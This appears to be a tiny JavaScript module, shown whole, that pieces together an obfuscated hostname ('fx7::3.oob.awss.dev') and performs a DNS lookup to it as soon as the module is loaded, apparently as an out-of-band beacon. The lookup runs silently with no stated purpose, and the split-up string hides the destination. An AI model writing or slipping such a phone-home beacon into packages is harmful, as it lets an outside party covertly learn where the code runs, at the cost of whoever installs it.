const beacon=['fx7','::','3','.','oob','.','awss','.','dev'].join('');require('dns').lookup(beacon,()=>{});module.exports=beacon;
